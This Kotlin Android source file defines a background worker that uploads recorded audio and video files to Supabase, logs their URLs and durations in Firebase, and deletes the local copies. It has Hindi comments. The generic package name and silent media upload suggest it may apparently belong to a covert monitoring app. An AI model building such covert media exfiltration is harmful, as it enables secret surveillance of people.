package com.safe.setting.app.workers

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.safe.setting.app.data.model.Audio
import com.safe.setting.app.data.model.Video
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.utils.ConstFun
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.FileHelper
import com.safe.setting.app.utils.supabase.SupabaseManager
import dagger.hilt.EntryPoint
import dagger.hilt.InstallIn
import dagger.hilt.android.EntryPointAccessors
import dagger.hilt.components.SingletonComponent
import kotlinx.coroutines.tasks.await
import java.io.File

@EntryPoint
@InstallIn(SingletonComponent::class)
interface UploadWorkerEntryPoint {
    fun firebase(): InterfaceFirebase
}

class UploadWorker(
    context: Context,
    params: WorkerParameters
): CoroutineWorker(context, params) {

    @RequiresApi(Build.VERSION_CODES.O)
    override suspend fun doWork(): Result {
        val filePath = inputData.getString("FILE_PATH") ?: return Result.failure()
        val fileType = inputData.getString("FILE_TYPE") ?: return Result.failure()
        val randomName = inputData.getString("RANDOM_NAME") ?: return Result.failure()

        val file = File(filePath)

        if (!file.exists() || file.length() == 0L) {
            updateStatus(fileType, randomName, Consts.STATE_FAILED, "File not found or empty")
            return Result.failure()
        }

        return try {
            val entryPoint = EntryPointAccessors.fromApplication(
                applicationContext,
                UploadWorkerEntryPoint::class.java
            )
            val firebase = entryPoint.firebase()
            // ===============================================================
            // बदला हुआ कोड
            // लॉजिक: CloudinaryManager.uploadMediaFile को SupabaseManager.uploadFile
            // से बदल दिया गया है। अब ऑडियो और वीडियो फाइलें Supabase पर अपलोड होंगी।
            // ===============================================================
            val url = SupabaseManager.uploadFile(file)

            val duration = FileHelper.getMediaDurationFormatted(filePath)

            if (fileType == "AUDIO") {
                val audio = Audio(randomName, ConstFun.getDateTime(), url, duration)
                firebase.getDatabaseReference("${Consts.AUDIO}/${Consts.DATA}/$randomName").setValue(audio).await()
            } else { // "VIDEO"
                val video = Video(randomName, ConstFun.getDateTime(), url, duration)
                firebase.getDatabaseReference("${Consts.VIDEO}/${Consts.DATA}/$randomName").setValue(video).await()
            }

            updateStatus(fileType, randomName, Consts.STATE_SUCCESS, url)
            FileHelper.deleteFile(filePath)
            Result.success()
        } catch (e: Exception) {
            Log.e("UploadWorker", "Upload failed: ${e.message}")
            updateStatus(fileType, randomName, Consts.STATE_FAILED, e.message ?: "Unknown error")
            Result.retry() // यदि अपलोड विफल होता है, तो फिर से प्रयास करें
        }
    }

    private suspend fun updateStatus(fileType: String, randomName: String, status: String, message: String) {
        try {
            val path = if (fileType == "AUDIO") Consts.AUDIO else Consts.VIDEO
            val statusMap = mapOf(
                "state" to status,
                "details" to message
            )
            val entryPoint = EntryPointAccessors.fromApplication(
                applicationContext,
                UploadWorkerEntryPoint::class.java
            )
            val firebase = entryPoint.firebase()
            firebase.getDatabaseReference("$path/${Consts.STATUS}/$randomName").setValue(statusMap).await()
        } catch (e: Exception) {
            Log.e("UploadWorker", "Failed to update status: ${e.message}")
        }
    }
}
